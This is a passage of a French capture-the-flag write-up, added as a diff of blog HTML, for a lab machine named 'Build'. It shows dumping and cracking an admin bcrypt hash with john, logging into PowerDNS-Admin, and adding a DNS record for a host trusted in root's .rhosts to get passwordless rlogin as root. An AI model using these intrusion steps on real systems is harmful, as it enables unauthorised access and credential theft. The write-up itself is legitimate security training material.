+</span></span><span class="line"><span class="cl"><span class="p">|</span> firstname  <span class="p">|</span> varchar<span class="o">(</span>64<span class="o">)</span>  <span class="p">|</span> YES  <span class="p">|</span>     <span class="p">|</span> NULL    <span class="p">|</span>                <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> lastname   <span class="p">|</span> varchar<span class="o">(</span>64<span class="o">)</span>  <span class="p">|</span> YES  <span class="p">|</span>     <span class="p">|</span> NULL    <span class="p">|</span>                <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> email      <span class="p">|</span> varchar<span class="o">(</span>128<span class="o">)</span> <span class="p">|</span> YES  <span class="p">|</span>     <span class="p">|</span> NULL    <span class="p">|</span>                <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> otp_secret <span class="p">|</span> varchar<span class="o">(</span>16<span class="o">)</span>  <span class="p">|</span> YES  <span class="p">|</span>     <span class="p">|</span> NULL    <span class="p">|</span>                <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> role_id    <span class="p">|</span> int<span class="o">(</span>11<span class="o">)</span>      <span class="p">|</span> YES  <span class="p">|</span> MUL <span class="p">|</span> NULL    <span class="p">|</span>                <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> confirmed  <span class="p">|</span> tinyint<span class="o">(</span>1<span class="o">)</span>   <span class="p">|</span> NO   <span class="p">|</span>     <span class="p">|</span> NULL    <span class="p">|</span>                <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+------------+--------------+------+-----+---------+----------------+
+</span></span><span class="line"><span class="cl"><span class="m">9</span> rows in <span class="nb">set</span> <span class="o">(</span>0.084 sec<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">MariaDB <span class="o">[</span>powerdnsadmin<span class="o">]</span>&gt; <span class="k">select</span> username,password,otp_secret from user<span class="p">;</span>
+</span></span><span class="line"><span class="cl">+----------+--------------------------------------------------------------+------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> username <span class="p">|</span> password                                                     <span class="p">|</span> otp_secret <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+----------+--------------------------------------------------------------+------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> admin    <span class="p">|</span> <span class="nv">$2</span>b<span class="nv">$12$s1hK0o7YNkJGfu5poWx</span>.0u1WLqKQIgJOXWjjXz7Ze3Uw5Sc2.hsEq <span class="p">|</span> NULL       <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+----------+--------------------------------------------------------------+------------+
+</span></span><span class="line"><span class="cl"><span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.090 sec<span class="o">)</span></span></span></code></pre></div></div>
+<p>Je craque ce hash avec <code>john</code> et je trouve le mot de passe <code>winston</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">/workspace/Build
+</span></span><span class="line"><span class="cl">❯ john --wordlist<span class="o">=</span><span class="sb">`</span>fzf-wordlists<span class="sb">`</span> admin.hash
+</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
+</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>bcrypt <span class="o">[</span>Blowfish 32/64 X3<span class="o">])</span>
+</span></span><span class="line"><span class="cl">Cost <span class="m">1</span> <span class="o">(</span>iteration count<span class="o">)</span> is <span class="m">4096</span> <span class="k">for</span> all loaded hashes
+</span></span><span class="line"><span class="cl">Will run <span class="m">16</span> OpenMP threads
+</span></span><span class="line"><span class="cl">Note: Passwords longer than <span class="m">24</span> <span class="o">[</span>worst <span class="k">case</span> UTF-8<span class="o">]</span> to <span class="m">72</span> <span class="o">[</span>ASCII<span class="o">]</span> truncated <span class="o">(</span>property of the <span class="nb">hash</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, <span class="s1">&#39;h&#39;</span> <span class="k">for</span> help, almost any other key <span class="k">for</span> status
+</span></span><span class="line"><span class="cl">winston          <span class="o">(</span>?<span class="o">)</span>
+</span></span><span class="line"><span class="cl">1g 0:00:00:15 DONE <span class="o">(</span>2025-12-07 20:58<span class="o">)</span> 0.06452g/s 92.90p/s 92.90c/s 92.90C/s winston..michel
+</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span class="line"><span class="cl">Session completed.</span></span></code></pre></div></div>
+<h2 id="connexion-à-powerdns-admin">Connexion à PowerDNS-Admin</h2>
+<p>Je me connecte sur le <code>http://172.18.0.6/login</code> à <a href="https://github.com/PowerDNS-Admin/PowerDNS-Admin" target="_blank" rel="noopener noreffer ">PowerDNS-Admin</a> avec les identifiants <code>admin:winston</code>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Build/Build-8.png"
+        data-srcset="/images/Build/Build-8.png, /images/Build/Build-8.png 1.5x, /images/Build/Build-8.png 2x"
+        data-sizes="auto"
+        alt="/images/Build/Build-8.png"
+        title="/images/Build/Build-8.png" width="456" height="499" /></p>
+<p>J&rsquo;arrive alors sur l&rsquo;interface administrateur de <code>PowerDNS-Admin</code>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Build/Build-9.png"
+        data-srcset="/images/Build/Build-9.png, /images/Build/Build-9.png 1.5x, /images/Build/Build-9.png 2x"
+        data-sizes="auto"
+        alt="/images/Build/Build-9.png"
+        title="/images/Build/Build-9.png" width="1920" height="934" /></p>
+<p>Le domaine <code>build.vl</code> contient plusieurs enregistrements DNS.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Build/Build-10.png"
+        data-srcset="/images/Build/Build-10.png, /images/Build/Build-10.png 1.5x, /images/Build/Build-10.png 2x"
+        data-sizes="auto"
+        alt="/images/Build/Build-10.png"
+        title="/images/Build/Build-10.png" width="1649" height="618" /></p>
+<p>En revenant sur le docker, dans le répertoire personnel du root se trouve le fichier <code>.rhosts</code> qui contient deux enregistrements. Ce fichier permet aux utilisateurs venant de ces domaines de se connecter à RLogin sans mot de passe.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">root@5ac6c7d6fb8e:~# ls -al
+</span></span><span class="line"><span class="cl">total <span class="m">20</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> root root <span class="m">4096</span> May  <span class="m">2</span>  <span class="m">2024</span> .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">1</span> root root <span class="m">4096</span> May  <span class="m">9</span>  <span class="m">2024</span> ..
+</span></span><span class="line"><span class="cl">lrwxrwxrwx <span class="m">1</span> root root    <span class="m">9</span> May  <span class="m">1</span>  <span class="m">2024</span> .bash_history -&gt; /dev/null
+</span></span><span class="line"><span class="cl">-r-------- <span class="m">1</span> root root   <span class="m">35</span> May  <span class="m">1</span>  <span class="m">2024</span> .rhosts
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> May  <span class="m">1</span>  <span class="m">2024</span> .ssh
+</span></span><span class="line"><span class="cl">-rw------- <span class="m">1</span> root root   <span class="m">33</span> Apr <span class="m">15</span>  <span class="m">2025</span> user.txt
+</span></span><span class="line"><span class="cl">root@5ac6c7d6fb8e:~# cat .rhosts
+</span></span><span class="line"><span class="cl">admin.build.vl +
+</span></span><span class="line"><span class="cl">intern.build.vl +</span></span></code></pre></div></div>
+<h2 id="empoisonnement-dns">Empoisonnement DNS</h2>
+<p>Le domaine <code>admin.build.vl</code> n&rsquo;étant pas encore enregistré, je l&rsquo;enregistre et je pointe son adresse IP comme l&rsquo;adresse IP de ma machine.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Build/Build-11.png"
+        data-srcset="/images/Build/Build-11.png, /images/Build/Build-11.png 1.5x, /images/Build/Build-11.png 2x"
+        data-sizes="auto"
+        alt="/images/Build/Build-11.png"
+        title="/images/Build/Build-11.png" width="1666" height="709" /></p>
+<p>Donc tous les utilisateurs se trouvant sur ma machine peuvent alors se connecter à la machine sans mot de passe. Je me connecte alors en tant que l&rsquo;utilisateur root et je récupère le second flag.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-sh">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">/workspace/Build
+</span></span><span class="line"><span class="cl">❯ rlogin 10.129.234.169 -l root
+</span></span><span class="line"><span class="cl">Welcome to Ubuntu 22.04.5 LTS <span class="o">(</span>GNU/Linux 5.15.0-144-generic x86_64<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> * Documentation:  https://help.ubuntu.com
+</span></span><span class="line"><span class="cl"> * Management:     https://landscape.canonical.com
+</span></span><span class="line"><span class="cl"> * Support:        https://ubuntu.com/pro
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> System information as of Sun Dec  <span class="m">7</span> 08:17:30 PM UTC <span class="m">2025</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  System load:  0.01              Processes:             <span class="m">189</span>
+</span></span><span class="line"><span class="cl">  Usage of /:   67.3% of 9.75GB   Users logged in:       <span class="m">0</span>
+</span></span><span class="line"><span class="cl">  Memory usage: 42%               IPv4 address <span class="k">for</span> eth0: 10.129.234.169
+</span></span><span class="line"><span class="cl">  Swap usage:   0%
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="o">=</span>&gt; There is <span class="m">1</span> zombie process.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Expanded Security Maintenance <span class="k">for</span> Applications is not enabled.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="m">1</span> update can be applied immediately.
+</span></span><span class="line"><span class="cl"><span class="m">1</span> of these updates is a standard security update.
+</span></span><span class="line"><span class="cl">To see these additional updates run: apt list --upgradable
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Enable ESM Apps to receive additional future security updates.
+</span></span><span class="line"><span class="cl">See https://ubuntu.com/esm or run: sudo pro status
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">The list of available updates is more than a week old.
+</span></span><span class="line"><span class="cl">To check <span class="k">for</span> new updates run: sudo apt update
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">root@build:~# id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span><span class="line"><span class="cl">root@build:~# ls
+</span></span><span class="line"><span class="cl">int  root.txt  scripts  snap
+</span></span><span class="line"><span class="cl">root@build:~# cat root.txt
+</span></span><span class="line"><span class="cl">b7b1******************************</span></span></code></pre></div></div>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-12-11</span>
+            </div><div id="page-views" class="post-info-mod">
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/build/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://localhost:1313/build/" data-title="Build" data-via="z3rodol" data-hashtags="Linux,Medium,PowerDNS"><i class="fab fa-x-twitter" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags" aria-hidden="true"></i>&nbsp;<a href="/tags/linux/">Linux</a>,&nbsp;<a href="/tags/medium/">Medium</a>,&nbsp;<a href="/tags/powerdns/">PowerDNS</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/certificate/" class="prev" rel="prev" title="Certificate"><i class="fas fa-angle-left" aria-hidden="true"></i>Certificate</a>
+            <a href="/baby/" class="next" rel="next" title="Baby">Baby<i class="fas fa-angle-right" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.158.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 1.0.0"><i class="far fa-kiss-wink-heart" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright" aria-hidden="true"></i><span itemprop="copyrightYear">2025 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://z3rodol.github.io" target="_blank">z3rodol</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/lunr/lunr.min.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/lightgallery/lightgallery.min.js"></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script src="/lib/katex/katex.min.js"></script><script src="/lib/katex/contrib/auto-render.min.js"></script><script src="/lib/katex/contrib/copy-tex.min.js"></script><script src="/lib/katex/contrib/mhchem.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":15,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script src="/js/theme.js"></script></body>
+</html>
